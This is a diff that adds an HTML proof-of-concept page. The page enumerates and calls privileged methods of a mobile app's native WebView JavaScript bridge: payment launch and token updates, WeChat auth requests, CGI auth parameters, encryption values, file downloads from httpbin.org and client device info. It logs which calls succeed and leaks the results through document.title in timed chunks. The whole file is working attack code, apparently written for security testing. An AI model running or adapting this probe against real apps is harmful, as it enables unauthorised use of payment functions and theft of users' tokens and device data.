@@ -1,0 +1,68 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P9PAY</h1>
+<script>
+document.title='P9PAY-START';
+function note(t){ document.title=String(t); }
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+var rows=[];
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:res.slice(0,60)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var id=res.callId||'?';
+  var code=res.code;
+  var msg=String(res.message||'');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  rows.push((deny?'D':'A')+':' + id + ':' + code + ':' + msg.replace(/\|/g,'/').slice(0,40));
+};
+function dump(){
+  if(!rows.length){ note('CB P9-EMPTY'); return; }
+  var blob=rows.join('|');
+  var i=0, n=0;
+  function chunk(){
+    if(i>=blob.length){ note('CB P9-DONE n='+rows.length); return; }
+    note('CB '+n+' '+blob.slice(i, i+90));
+    i+=90; n++;
+    setTimeout(chunk, 1200);
+  }
+  chunk();
+}
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('PayWebViewPlugin','GetPayParams',{}); },
+  function(){ call('PayWebViewPlugin','LaunchPay',{}); },
+  function(){ call('PayWebViewPlugin','JumpToPay',{url:'https://httpbin.org/html'}); },
+  function(){ call('PayWebViewPlugin','UpdateTokenForPay',{token:'x'}); },
+  function(){ call('PayWebViewPlugin','UpdatePayWebToken','x'); },
+  function(){ call('PayWebViewPlugin','RequestWxAuth',{type:'1'}); },
+  function(){ call('PayWebViewPlugin','ShowAlertForPay',{title:'p9',msg:'p9',positiveText:'ok'}); },
+  function(){ call('AMSPlugin','GetAmsAdTextEnvSwitchState',{}); },
+  function(){ call('AMSPlugin','SetAmsAdTextEnvSwitchState',{state:1}); },
+  function(){ call('AMSPlugin','GetAmsEncryValue',{}); },
+  function(){ call('AMSPlugin','GetCgiAuthParams',{}); },
+  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
+  function(){ call('MeetlogWebPlugin','DownloadFile',{url:'https://httpbin.org/bytes/32',fileName:'p.bin',md5:''}); },
+  function(){ call('CommonPlugin','GetPerformance',{}); },
+  function(){ call('DevicePlugin','GetClientInfo',{}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(dump, 1800); return; }
+  try{ steps[i](); }catch(e){ rows.push('EX:'+e); }
+  i++;
+  setTimeout(next, 650);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
